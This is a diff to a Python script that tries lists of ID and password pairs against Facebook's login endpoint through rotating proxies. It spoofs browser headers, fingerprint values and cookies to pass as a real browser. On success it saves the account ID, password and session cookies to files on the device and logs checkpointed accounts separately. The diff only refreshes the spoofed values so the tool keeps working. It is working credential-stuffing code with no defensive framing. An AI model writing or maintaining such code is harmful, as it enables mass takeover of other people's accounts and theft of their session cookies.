@@ -39,49 +39,47 @@ for user in dx:
         ids, pw = ids.strip(), pw.strip()
     except:
         continue
-    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
+    sys.stdout.write(f"\r ⏳ () ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
     sys.stdout.flush()
     try:
         nip = random.choice(xvx)
         proxs = {'http': nip}
         Session = requests.Session()
-        free_fb = Session.get('https://m.facebook.com').text
+        free_fb = Session.get('https://touch.facebook.com').text
         data = {
-        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
         'email': ids,
-        'timezone': '-330',
-        'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-        'lgnrnd': '060331_lb2E',
-        'lgnjs': '1751375011',
-        'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
+        'cuid': '',
+        'guid': 'f99704105df093dd0',
+        'lgnjs': '1786642260',
+        'lgnrnd': '103059_2xLj',
         'locale': 'hi_IN',
-        'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-        'guid': 'f13465d1007fbcb28',
+        'login_source': 'comet_login_header',
+        'next': 'https://www.facebook.com/watch',
+        'skstamp': '',
+        'timezone': '-330',
         'prefill_contact_point': '',
-        'prefill_source': 'browser_dropdown',
-        'prefill_type': 'password',
+        'prefill_source': '',
+        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+        'lgndim': 'eyJ3IjoxNjgwLCJoIjoxMDUwLCJhdyI6MTY4MCwiYWgiOjEwNTAsImMiOjI0fQ==',
+        'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
         'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
         cookies = {
-        'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
-        'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
-        'ps_l': '1',
-        'ps_n': '1',
+        'datr': 'WDxoakUoKsgNSfEPoU81xqVu',
+        'sb': 'WDxoapiP73OCuxpZnfPFk97U',
         'locale': 'hi_IN',
-        'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
-        'wd': '885x751',}
+        'fr': '0XIWEirsGdY8SJOuR..Bqawvz..AAA.0.0.Bqff9P.AWdzvkqtTFsCe7F9Z_WeUuJ4KR8',
+        'wd': '1189x779',}
         headers = {
-        'authority': 'www.facebook.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.5',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        'dpr': '1',
         'origin': 'https://www.facebook.com',
-        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-        'sec-ch-prefers-color-scheme': 'dark',
-        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
-        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
+        'priority': 'u=0, i',
+        'referer': 'https://www.facebook.com/watch',
+        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Google Chrome";v="151.0.0.0", "Chromium";v="151.0.0.0"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-model': '""',
         'sec-ch-ua-platform': '"Windows"',
@@ -90,22 +88,22 @@ for user in dx:
         'sec-fetch-mode': 'navigate',
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
+        'sec-gpc': '1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-        'viewport-width': '885',}
-        url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',}
+        url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
         response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
         cookie_data = Session.cookies.get_dict()
         if "c_user" in cookie_data:
             cid = cookie_data["c_user"]
             coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
-            print(f"\n✅ OK: {cid}|{pw}")
+            print(f"\n✅ DONE: {cid}|{pw}")
             print(f"🍪 Cookie: {coki}")
-            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+            open("/sdcard/NEW-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
             oks.append(cid)
         elif 'checkpoint' in cookie_data:
             print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
-            open('/sdcard/ATOM-CP.txt', 'a').write(f'{ids}|{pw}\n')
+            open('/sdcard/NEW-FAIL.txt', 'a').write(f'{ids}|{pw}\n')
             cps.append(ids)
         else:
             print("\n❌ FAIL: Login not successful.")
